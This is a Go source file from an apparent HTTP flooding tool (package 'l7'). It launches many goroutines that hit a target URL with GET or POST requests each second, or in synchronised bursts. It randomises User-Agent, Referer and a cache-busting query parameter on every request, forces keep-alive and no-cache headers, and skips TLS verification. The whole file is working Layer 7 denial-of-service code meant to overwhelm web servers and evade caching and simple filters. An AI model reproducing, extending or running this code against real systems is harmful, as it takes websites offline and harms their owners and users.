// Author: PiereLucas

package l7

import (
	"context"
	"crypto/tls"
	"log"
	"math/rand"
	"net/http"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// makeRequest - alternative makeRequest() function for work together with syncedStart()
func syncedMakeRequest(start <-chan struct{}, info *Layer7) {
	<-start

	// Set Transport states
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // skip tls verify for more speed
		Proxy:           http.ProxyFromEnvironment,             // use proxies from environment variables
	}

	// Initialize Client
	hc := &http.Client{
		Transport: tr,
	}

	result := make(chan *http.Request)
	go buildRequest(result, info) // Building our request
	req := <-result               // Wait for our request

	r := runtime.NumGoroutine()
	resp, err := hc.Do(req)
	if err != nil {
		//log.Printf("ERROR: do post request: %s\n", err) // FOR DEBUG
		log.Printf("\tRoutine: %6d |    CONNECTION DOWN (DIAL ERROR) | [%s] %s\n", r, info.mode, req.URL)

		close(result) // Close request result channel

	} else { // Catch some Error e.g. "socket: too many open files" or "socket: connection reset by peer"
		defer resp.Body.Close() // Close response body at end of function

		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | [%s] %s\n", r, info.mode, req.URL)
		} else {
			log.Printf("\tRoutine: %6d |   Argh! Online but Broken [%3d] | [%s] %s\n", r, resp.StatusCode, info.mode, req.URL)
		}

		close(result) // Close request result channel
	}
}

// syncedStart - alternative start() function for synchronised start of syncedMakeRequest()
// flooding comes in intervals of 1sec
func syncedStart(ctx context.Context, info *Layer7, done chan<- struct{}) {
	// Build initial request (It's irrelevant if GET or POST cause we don't send this initial request to target)
	func() {
		log.Println("INFO: Building Initial Request")
		result := make(chan *http.Request) // create channel result
		go buildRequest(result, info)      // Building initial request
		_ = <-result
		close(result) // Wait for initial request to be done
	}()

	close(done)

	for {
		select {
		case <-ctx.Done():
			log.Println("INFO: Shutdown runner...")
			return
		default:
			start := make(chan struct{})
			for i := 1; i < info.threads+1; i++ {
				go syncedMakeRequest(start, info)
			}
			close(start)
			time.Sleep(1 * time.Second)
		}
	}
}

// makeRequest - handle our complete request workflow. Build Clients and Requests
func makeRequest(done chan<- struct{}, info *Layer7) {
	// Set Transport states
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // skip tls verify for more speed
		Proxy:           http.ProxyFromEnvironment,             // use proxies from environment variables
	}

	// Initialize Client
	hc := &http.Client{
		Transport: tr,
	}

	result := make(chan *http.Request)
	go buildRequest(result, info) // Building our request
	req := <-result               // Wait for our request

	r := runtime.NumGoroutine()
	resp, err := hc.Do(req)
	if err != nil {
		//log.Printf("ERROR: do post request: %s\n", err) // FOR DEBUG
		log.Printf("\tRoutine: %6d |    CONNECTION DOWN (DIAL ERROR) | [%s] %s\n", r, info.mode, req.URL)

		close(result) // Close request result channel
		close(done)   // sending empty data to done channel
	} else { // Catch some Error e.g. "socket: too many open files" or "socket: connection reset by peer"
		defer resp.Body.Close() // Close response body at end of function

		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | [%s] %s\n", r, info.mode, req.URL)
		} else {
			log.Printf("\tRoutine: %6d |   Argh! Online but Broken [%3d] | [%s] %s\n", r, resp.StatusCode, info.mode, req.URL)
		}

		close(result) // Close request result channel
		close(done)   // sending empty data to done channel
	}
}

// buildRequest - building POST request and copy forms and headers in a peristent state
func buildRequest(result chan<- *http.Request, info *Layer7) {
	// Return function headers set
	returnReqHeadersSet := func(req *http.Request) {
		// Building initial request
		if info.persistentHeaders == nil { // add headers and authorization (if set) to request and make it persistent
			log.Println("INFO: Make custom Header and Authorization (if set) persistent") // log the build request
			for key, value := range info.headers {
				req.Header.Set(key, value)
			}
			if info.authSet {
				req.SetBasicAuth(info.authUser, info.authPass) // base64 encode auth and set value to header
				tempVal := req.Header.Values("Authorization")[0]
				req.Header.Set("Authorization", tempVal) // Set the base64 encoded authorization header
			}

			// overrride user preferences "Accept-Charset", Connection" and "Cache-Control"
			func() {
				log.Println("INFO: overrride user preferences Accept-Charset, Connection and Cache-Control")
				log.Println("INFO: override Keep-Alive, Referer and User-Agent random on every new request")
				req.Header.Set("Accept-Charset", acceptCharset)
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Cache-Control", "no-cache")
			}()

			info.persistentHeaders = req.Header.Clone() // clone req.Header into info.persistenHeader

		} else {
			req.Header = info.persistentHeaders.Clone() // clone persistent headers to request headers
			// Change some header preferences on every single request. Override the persistent state of the keys
			func() {
				req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
				req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
				req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
			}()
		}
		result <- req // send request over channel back to ... (maybe calling function, or, wherever the channel waits)
	}

	// Return function headers not-set
	returnReq := func(req *http.Request) {
		// Set headers
		req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
		req.Header.Set("Accept-Charset", acceptCharset)
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")

		if info.authSet {
			req.SetBasicAuth(info.authUser, info.authPass) // base64 encode auth and set value to header
			tempVal := req.Header.Values("Authorization")[0]
			req.Header.Set("Authorization", tempVal) // Set the base64 encoded authorization header
		}

		result <- req // send request over channel back to ... (maybe calling function, or, wherever the channel waits)
	}

	// Building Request GET or POST mode available
	if info.mode == "GET" {
		// param joiner
		var paramJoiner string
		if strings.ContainsRune(info.webaddress, '?') {
			paramJoiner = "&"
		} else {
			paramJoiner = "?"
		}

		/*
			// Build random parameter
			r := rand.New(rand.NewSource(time.Now().UnixNano())) // Generate Random int
			rndp := fmt.Sprintf("?rand=%d", r.Uint64())
		*/

		// Building request and add values to request
		req, err := http.NewRequest("GET", info.webaddress+paramJoiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		if err != nil {
			log.Println("ERROR: building request")
		}

		if info.headers == nil {
			returnReq(req)
		} else {
			returnReqHeadersSet(req)
		}
	} else if info.mode == "POST" {
		// Building request and add values to request
		req, err := http.NewRequest("POST", info.webaddress, strings.NewReader(info.formnames.Encode()))
		if err != nil {
			log.Println("ERROR: building request")
		}

		req.PostForm = info.formnames // reference url.Values too request

		if info.headers == nil {
			returnReq(req)
		} else {
			returnReqHeadersSet(req)
		}
	} else {
		log.Fatalln("ERROR: buildingRequest() unrecognized MODE")
	}
}

// runner - function with context that start makeRequest() and return on ctx.Done()
func runner(ctx context.Context, start <-chan struct{}, info *Layer7) {
	<-start // Starting routine on close of channel starter

	for {
		select {
		case <-ctx.Done(): // Quit routine on receive
			log.Println("INFO: Shutdown runner...")
			return // Close runner goroutine
		default:
			done := make(chan struct{})
			go makeRequest(done, info)
			select {
			case <-done: // Continue when the reset finish faster than 1sec (This will mostly not happen, definitivly)
				continue
			case <-time.After(1 * time.Second): // make sure that every second start a new request, still when the last not finish yet
				continue
			}
		}
	}
}

// start - starting N*runner() and building initial request
func start(ctx context.Context, info *Layer7, done chan<- struct{}) {
	start := make(chan struct{})

	// starting as many routines as defined by user
	for i := 1; i < info.threads+1; i++ {
		log.Printf("INFO: Starting routine: %d\n", i)
		go runner(ctx, start, info)
	}

	// Build initial request, check for possible occuring errors and make forms and headers persistent.
	func() {
		log.Println("INFO: Building Initial Request")
		result := make(chan *http.Request) // create channel result
		go buildRequest(result, info)      // Building initial request
		_ = <-result
		close(result) // Wait for initial request to be done
	}()

	close(start) // close channel starter to start runner routines
	close(done)  // synchronise and unlock sync in parent function
}
